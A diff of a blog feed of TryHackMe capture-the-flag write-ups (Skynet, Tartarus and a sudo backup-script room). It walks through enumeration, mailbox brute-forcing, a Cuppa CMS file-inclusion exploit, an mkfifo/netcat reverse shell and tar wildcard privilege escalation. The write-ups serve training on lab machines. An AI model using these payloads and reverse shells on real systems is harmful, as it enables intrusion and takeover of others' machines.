+&lt;p&gt;Scanning through the files I find ‘secret.txt’ which is a note from the author.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;shoutout to all the people who have gotten to this stage whoop whoop&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;
+
+&lt;p&gt;In the files is also ‘note.txt’ which provides SSH creds.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Wow I’m awful at remembering Passwords so I’ve taken my Friends advice and noting them down!&lt;/p&gt;
+
+  &lt;p&gt;alex:{REDACTED}&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;With these I SSH in to the machine.&lt;/p&gt;
+
+&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;
+
+&lt;p&gt;Doing ‘sudo -l’ shows Alex can run ‘/etc/mp3backups/backup.sh’ as root without a password.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;alex@ubuntu:~$ sudo -l
+Matching Defaults entries for alex on ubuntu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User alex may run the following commands on ubuntu:
+    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Looking at the script, it appears to be a simple back up script archiving all mp3 files in the Alex music directory however it also always accepts a parameter with ‘-c’ and executes it.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;#!/bin/bash
+
+sudo find / -name &quot;*.mp3&quot; | sudo tee /etc/mp3backups/backed_up_files.txt
+
+
+input=&quot;/etc/mp3backups/backed_up_files.txt&quot;
+#while IFS= read -r line
+#do
+  #a=&quot;/etc/mp3backups/backed_up_files.txt&quot;
+#  b=$(basename $input)
+  #echo
+#  echo &quot;$line&quot;
+#done &amp;lt; &quot;$input&quot;
+
+while getopts c: flag
+do
+        case &quot;${flag}&quot; in
+                c) command=${OPTARG};;
+        esac
+done
+
+backup_files=&quot;/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3&quot;
+
+# Where to backup to.
+dest=&quot;/etc/mp3backups/&quot;
+
+# Create archive filename.
+hostname=$(hostname -s)
+archive_file=&quot;$hostname-scheduled.tgz&quot;
+
+# Print start status message.
+echo &quot;Backing up $backup_files to $dest/$archive_file&quot;
+
+echo
+
+# Backup the files using tar.
+tar czf $dest/$archive_file $backup_files
+
+# Print end status message.
+echo
+echo &quot;Backup finished&quot;
+
+cmd=$($command)
+echo $cmd
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There a few ways to get root as you can run any command as root, you could cat the flag or create a reverse shell however, by giving bash a SUID bit with the command:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;sudo ./backup.sh -c ‘chmod +s /bin/bash’&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Now I can get a root shell!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;alex@ubuntu:/etc/mp3backups$ bash -p
+bash-4.3# whoami
+root
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Thanks for reading!&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      <author>
+          <name>Darryn</name>
+        
+        
+      </author>
+
+      
+
+      
+        <category term="tryhackme" />
+      
+        <category term="ctf" />
+      
+        <category term="easy" />
+      
+
+      
+        <summary type="html"></summary>
+      
+
+      
+      
+    </entry>
+  
+    <entry>
+      <title type="html">Skynet Write Up</title>
+      <link href="https://darrynbrownfield.co.uk/skynet" rel="alternate" type="text/html" title="Skynet Write Up" />
+      <published>2021-01-30T00:00:00+00:00</published>
+      <updated>2021-01-30T00:00:00+00:00</updated>
+      <id>https://darrynbrownfield.co.uk/skynet</id>
+      <content type="html" xml:base="https://darrynbrownfield.co.uk/skynet">&lt;p&gt;&lt;img src=&quot;/assets/images/skynet/cover.png&quot; alt=&quot;skynet&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/&quot;&gt;Skynet&lt;/a&gt; is a easy rated CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt;.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Are you able to compromise this Terminator themed machine?&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+
+&lt;p&gt;I deployed the machine and was given the target IP 10.10.120.207. I started a NMAP scan to check the available ports.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oN nmap/initial 10.10.120.207
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-24 16:37 GMT
+Nmap scan report for 10.10.120.207
+Host is up (0.032s latency).
+Not shown: 994 closed ports
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
+|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
+|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
+80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Skynet
+110/tcp open  pop3        Dovecot pop3d
+|_pop3-capabilities: AUTH-RESP-CODE CAPA PIPELINING RESP-CODES UIDL SASL TOP
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+143/tcp open  imap        Dovecot imapd
+|_imap-capabilities: Pre-login IMAP4rev1 ENABLE LOGINDISABLEDA0001 more LOGIN-REFERRALS have SASL-IR listed ID capabilities LITERAL+ post-login IDLE OK
+445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 1h59m59s, deviation: 3h27m50s, median: 0s
+|_nbstat: NetBIOS name: SKYNET, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
+| smb-os-discovery:
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: skynet
+|   NetBIOS computer name: SKYNET\x00
+|   Domain name: \x00
+|   FQDN: skynet
+|_  System time: 2021-01-24T10:37:29-06:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2021-01-24T16:37:29
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.79 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;6 Ports open:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;22 - SSH - Banner is showing its an Ubuntu machine&lt;/li&gt;
+  &lt;li&gt;80 - HTTP - Apache web server version 2.4.18&lt;/li&gt;
+  &lt;li&gt;110 - POP3 - Dovecot&lt;/li&gt;
+  &lt;li&gt;139/445 - Samba&lt;/li&gt;
+  &lt;li&gt;143 - IMAP - Dovecot&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
+
+&lt;p&gt;A few ports to review but I started with SMB because typically in CTF’s you can find anonymous access to share which provide hints or files required on other ports. Using smbmap I found one accessible share called anonymous.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $smbmap -H 10.10.120.207
+[+] Guest session       IP: 10.10.120.207:445   Name: 10.10.120.207                                     
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        print$                                                  NO ACCESS       Printer Drivers
+        anonymous                                               READ ONLY       Skynet Anonymous Share
+        milesdyson                                              NO ACCESS       Miles Dyson Personal Share
+        IPC$                                                    NO ACCESS       IPC Service (skynet server (Samba, Ubuntu))
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Using smbclient I was able to connect to the share and found a text file and a folder of logs files. I downloaded all the files to my machine.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $smbclient //10.10.120.207/anonymous
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&amp;gt; ls
+  .                                   D        0  Thu Nov 26 16:04:00 2020
+  ..                                  D        0  Tue Sep 17 08:20:17 2019
+  attention.txt                       N      163  Wed Sep 18 04:04:59 2019
+  logs                                D        0  Wed Sep 18 05:42:16 2019
+
+                9204224 blocks of size 1024. 5822640 blocks available
+smb: \&amp;gt; get attention.txt 
+getting file \attention.txt of size 163 as attention.txt (1.2 KiloBytes/sec) (average 1.2 KiloBytes/sec)
+smb: \&amp;gt; cd logs
+smb: \logs\&amp;gt; ls
+  .                                   D        0  Wed Sep 18 05:42:16 2019
+  ..                                  D        0  Thu Nov 26 16:04:00 2020
+  log2.txt                            N        0  Wed Sep 18 05:42:13 2019
+  log1.txt                            N      471  Wed Sep 18 05:41:59 2019
+  log3.txt                            N        0  Wed Sep 18 05:42:16 2019
+
+                9204224 blocks of size 1024. 5819896 blocks available
+smb: \logs\&amp;gt; mget *
+Get file log2.txt? y
+getting file \logs\log2.txt of size 0 as log2.txt (0.0 KiloBytes/sec) (average 0.7 KiloBytes/sec)
+Get file log1.txt? y
+getting file \logs\log1.txt of size 471 as log1.txt (4.1 KiloBytes/sec) (average 1.8 KiloBytes/sec)
+Get file log3.txt? y
+getting file \logs\log3.txt of size 0 as log3.txt (0.0 KiloBytes/sec) (average 1.4 KiloBytes/sec)
+smb: \logs\&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The attention.txt file is a note:&lt;/p&gt;
+
+&lt;p&gt;“A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
+-Miles Dyson”&lt;/p&gt;
+
+&lt;p&gt;However log1.txt looks to be a password list. log2 and log3 are empty. I moved on to start enumerating the website.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/skynet/webpage.png&quot; alt=&quot;webpage&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nothing to note on the page or in the page source so I ran a gobuster.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Skynet]
+└──╼ $gobuster dir -u http://10.10.120.207 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.120.207
+[+] Threads:        50
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2021/01/24 16:38:47 Starting gobuster
+===============================================================
+/admin (Status: 301)
+/css (Status: 301)
+/js (Status: 301)
+/config (Status: 301)
+/ai (Status: 301)
+/squirrelmail (Status: 301)
+/server-status (Status: 403)
+===============================================================
+2021/01/24 16:41:06 Finished
+===============================================================
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;/squirrelmail brings to me to a login page.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/skynet/squirrelmail.png&quot; alt=&quot;squirrelmail&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Using Burp intruder I was able to find the login details for Miles. I created a username file with the following entries:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;miles&lt;/li&gt;
+  &lt;li&gt;mdyson&lt;/li&gt;
+  &lt;li&gt;milesdyson&lt;/li&gt;
+  &lt;li&gt;milesd&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Using this list of usernames and the passwords found in log1.txt I was able to access the email account.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/skynet/emails.png&quot; alt=&quot;emails&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;One of the emails is miles new SMB password.&lt;/p&gt;
+
+&lt;p&gt;“We have changed your smb password after system malfunction.
+Password: )s{A&amp;amp;2Z{REDACTED}”&lt;/p&gt;
+
+&lt;p&gt;Going back to smbclient I tried to connect to the SMB share milesdyson with the new password and got in.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $smbclient //10.10.120.207/milesdyson -U milesdyson -p                                         
+Enter WORKGROUP\milesdyson's password:                                                              
+Try &quot;help&quot; to get a list of possible commands.                                                      
+smb: \&amp;gt; ls                                                                                          
+  .                                   D        0  Tue Sep 17 10:05:47 2019                          
+  ..                                  D        0  Wed Sep 18 04:51:03 2019                          
+  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 10:05:14 2019                      
+  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 10:05:14 2019
+  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 10:05:14 2019                   
+  notes                               D        0  Tue Sep 17 10:18:40 2019                          
+  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 10:05:14 2019                   
+  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 10:05:14 2019           
+                                                                                                    
+                9204224 blocks of size 1024. 5810144 blocks available                               
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Only really one file of interest /notes/important.txt&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cat important.txt 
+
+1. Add features to beta CMS /45kra2{REDACTED}
+2. Work on T-800 Model 101 blueprints
+3. Spend more time with my wife
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;A new cms directory to probe, looking at the page it appears to be a blog page for Miles.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/skynet/miles.png&quot; alt=&quot;miles&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Running gobuster again against the directory reveals a administrator page.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $gobuster dir -u http://10.10.120.207/45kra2{REDACTED}/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.120.207/45kra2{REDACTED}/
+[+] Threads:        50
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2021/01/24 16:48:27 Starting gobuster
+===============================================================
+/administrator (Status: 301)
+===============================================================
+2021/01/24 16:50:42 Finished
+===============================================================
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;
+
+&lt;p&gt;Going to http://10.10.120.207/45kra2{REDACTED}/administrator/ takes us to a login page for Cuppa CMS. A quick Google reveals the &lt;a href=&quot;https://www.exploit-db.com/exploits/25971&quot;&gt;exploit&lt;/a&gt; which provides and local and remote file inclusion.&lt;/p&gt;
+
+&lt;p&gt;Looking at the exploit we can simply request a URL with our shell code location. We can use this to get a reverse shell payload from our machine and then execute.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;On my machine I copied /usr/share/webshells/php/php-reverse-shell.php to my working directory and renamed it to shell.php, I updated the configuration to include my VPN IP and port 4444.&lt;/p&gt;
+
+&lt;p&gt;Then using python3 I started a http server to host the reverse shell payload and started a netcat listener on port 4444. In my browser I entered:&lt;/p&gt;
+
+&lt;p&gt;http://10.10.120.207/45kra2{REDACTED}/administrator/alerts/alertConfigField.php?urlConfig=http:///shell.php&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo python3 -m http.server 80                                      
+                                                                          
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...                  
+10.10.120.207 - - [24/Jan/2021 16:57:15] &quot;GET /shell.php HTTP/1.0&quot; 200 -  
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;On my netcat listener I get a response and got a shell as ‘www-data’.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [] from (UNKNOWN) [10.10.120.207] 59292
+Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+ 10:57:15 up 22 min,  0 users,  load average: 0.00, 0.04, 0.06
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$   
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;
+
+&lt;p&gt;Looking at the file system there are two files backup.sh and backup.tgz both owned by root.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;drwxr-xr-x 2 root       root       4.0K Sep 17  2019 .
+drwxr-xr-x 5 milesdyson milesdyson 4.0K Sep 17  2019 ..
+-rwxr-xr-x 1 root       root         74 Sep 17  2019 backup.sh
+-rw-r--r-- 1 root       root       4.5M Jan 24 10:59 backup.tgz
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The script is really simple, just creating a backup tar file or /var/www/html.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ cat backup.sh
+#!/bin/bash
+cd /var/www/html
+tar cf /home/milesdyson/backups/backup.tgz *
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;However because the tar command is using * which is a wild card and it appears the script is being run by root as a cron job we can exploit this to get a reverse shell. This &lt;a href=&quot;https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/&quot;&gt;article&lt;/a&gt; explains it in detail.&lt;/p&gt;
+
+&lt;p&gt;I following the same steps in the article and set my port to 5555 as already have a shell on port 4444.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc  5555 &amp;gt;/tmp/f&quot; &amp;gt; shell.sh
+echo &quot;&quot; &amp;gt; &quot;--checkpoint-action=exec=sh shell.sh&quot;
+echo &quot;&quot; &amp;gt; &quot;--checkpoint=1&quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now just wait for a minute and we now have a root shell!&lt;/p&gt;
+
+&lt;p&gt;Thanks for reading!&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      <author>
+          <name>Darryn</name>
+        
+        
+      </author>
+
+      
+
+      
+        <category term="tryhackme" />
+      
+        <category term="ctf" />
+      
+        <category term="easy" />
+      
+
+      
+        <summary type="html"></summary>
+      
+
+      
+      
+    </entry>
+  
+    <entry>
+      <title type="html">Chocolate Factory Write Up</title>
+      <link href="https://darrynbrownfield.co.uk/chocolatefactory" rel="alternate" type="text/html" title="Chocolate Factory Write Up" />
       <published>2021-01-20T00:00:00+00:00</published>
       <updated>2021-01-20T00:00:00+00:00</updated>
       <id>https://darrynbrownfield.co.uk/chocolatefactory</id>
@@ -3293,894 +4068,6 @@ _|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
         <category term="bufferoverflow" />
       
         <category term="oscp" />
-      
-
-      
-        <summary type="html"></summary>
-      
-
-      
-      
-    </entry>
-  
-    <entry>
-      <title type="html">Tartarus Write Up</title>
-      <link href="https://darrynbrownfield.co.uk/Tartarus" rel="alternate" type="text/html" title="Tartarus Write Up" />
-      <published>2020-09-26T00:00:00+00:00</published>
-      <updated>2020-09-26T00:00:00+00:00</updated>
-      <id>https://darrynbrownfield.co.uk/Tartarus</id>
-      <content type="html" xml:base="https://darrynbrownfield.co.uk/Tartarus">&lt;p&gt;&lt;img src=&quot;/assets/images/tartarus/cover.jpeg&quot; alt=&quot;GitHappens&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
-
-&lt;p&gt;Tartarus is an fun easy room from &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt;. We have two tasks to complete, finding both the user and root flag. Typical CTF style room.&lt;/p&gt;
-
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
-
-&lt;p&gt;TryHackMe will assign a dynamic IP as part of the deployment, I’ve edited my /etc/hosts file with the name of the box and the assigned IP. I started by doing an nmap scan to check what ports are open.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
-└──╼ $sudo nmap -sC -sV -oA nmap/initial tartarus
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-26 16:16 BST
-Nmap scan report for tartarus (10.10.30.144)
-Host is up (0.026s latency).
-Not shown: 997 closed ports
-PORT   STATE SERVICE VERSION
-21/tcp open  ftp     vsftpd 3.0.3
-| ftp-anon: Anonymous FTP login allowed (FTP code 230)
-|_-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
-| ftp-syst: 
-|   STAT: 
-| FTP server status:
-|      Connected to ::ffff:10.8.21.217
-|      Logged in as ftp
-|      TYPE: ASCII
-|      No session bandwidth limit
-|      Session timeout in seconds is 300
-|      Control connection is plain text
-|      Data connections will be plain text
-|      At session startup, client count was 1
-|      vsFTPd 3.0.3 - secure, fast, stable
-|_End of status
-22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 98:6c:7f:49:db:54:cb:36:6d:d5:ff:75:42:4c:a7:e0 (RSA)
-|   256 0c:7b:1a:9c:ed:4b:29:f5:3e:be:1c:9a:e4:4c:07:2c (ECDSA)
-|_  256 50:09:9f:c0:67:3e:89:93:b0:c9:85:f1:93:89:50:68 (ED25519)
-80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-|_http-title: Apache2 Ubuntu Default Page: It works
-Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 8.18 seconds
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;3 Ports open:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;21 - FTP - Anonymous login allowed which is interesting will need to check what files and access is available&lt;/li&gt;
-  &lt;li&gt;22 - SSH - Banner is showing its an Ubuntu machine&lt;/li&gt;
-  &lt;li&gt;80 - HTTP - Apache web server&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;SSH has a smaller attack surface than the other ports so will leave that for now, I decided to look at FTP first.&lt;/p&gt;
-
-&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
-
-&lt;p&gt;Using the ftp utility I was able to login using the username ‘anonymous’ and password ‘anonymous’.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
-└──╼ $ftp tartarus
-Connected to tartarus.
-220 (vsFTPd 3.0.3)
-Name (tartarus:daz): anonymous
-331 Please specify the password.
-Password:
-230 Login successful.
-Remote system type is UNIX.
-Using binary mode to transfer files.
-ftp&amp;gt; ls
-200 PORT command successful. Consider using PASV.
-150 Here comes the directory listing.
--rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
-226 Directory send OK.
-ftp&amp;gt; ls -lah
-200 PORT command successful. Consider using PASV.
-150 Here comes the directory listing.
-drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 .
-drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
-drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ...
--rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
-226 Directory send OK.
-ftp&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Just one file test.txt, but what is also interesting is ‘…’ which is a folder. Typically you would find . (current directory) and .. (parent directory). Next I downloaded the test.txt file and checked the … directory.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;ftp&amp;gt; get test.txt
-local: test.txt remote: test.txt
-200 PORT command successful. Consider using PASV.
-150 Opening BINARY mode data connection for test.txt (17 bytes).
-226 Transfer complete.
-17 bytes received in 0.00 secs (38.8795 kB/s)
-ftp&amp;gt; cd ...
-250 Directory successfully changed.
-ftp&amp;gt; ls -lah
-200 PORT command successful. Consider using PASV.
-150 Here comes the directory listing.
-drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 .
-drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
-drwxr-xr-x    2 ftp      ftp          4096 Jul 05 21:31 ...
-226 Directory send OK.
-ftp&amp;gt; cd ...
-250 Directory successfully changed.
-ftp&amp;gt; ls -lah
-200 PORT command successful. Consider using PASV.
-150 Here comes the directory listing.
-drwxr-xr-x    2 ftp      ftp          4096 Jul 05 21:31 .
-drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
--rw-r--r--    1 ftp      ftp            14 Jul 05 21:45 yougotgoodeyes.txt
-226 Directory send OK.
-ftp&amp;gt; get yougotgoodeyes.txt
-local: yougotgoodeyes.txt remote: yougotgoodeyes.txt
-200 PORT command successful. Consider using PASV.
-150 Opening BINARY mode data connection for yougotgoodeyes.txt (14 bytes).
-226 Transfer complete.
-14 bytes received in 0.00 secs (19.1215 kB/s)
-ftp&amp;gt; exit
-221 Goodbye.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Navigating to … lists another folder called … but now we find another text file called yougotgoodeyes.txt.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
-└──╼ $cat test.txt 
-vsftpd test file
-┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
-└──╼ $cat yougotgoodeyes.txt 
-/sUp3r-s3cr3t
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;test.txt doesn’t give us anything to interesting, nmap was able to identify the FTP server was vsftpd. However, yougotgoodeyes.txt provides what looks like a web directory. Next step is to move on to port 80 and see what we can find. While I was reviewing FTP I had gobuster and nikto running in the background to enumerate the web service.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/tartarus/webpage.png&quot; alt=&quot;webpage&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;The webpage just displays the default apache page, I checked the source code but nothing stood out.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
-└──╼ $gobuster dir -u http://tartarus -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 
-===============================================================
-Gobuster v3.0.1
-by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
-===============================================================
-[+] Url:            http://tartarus
-[+] Threads:        50
-[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Status codes:   200,204,301,302,307,401,403
-[+] User Agent:     gobuster/3.0.1
-[+] Timeout:        10s
-===============================================================
-2020/09/26 16:32:10 Starting gobuster
-===============================================================
-/server-status (Status: 403)
-===============================================================
-2020/09/26 16:34:00 Finished
-===============================================================
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Gobuster also didn’t reveal anything.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
-└──╼ $nikto -host http://tartarus
-- Nikto v2.1.6
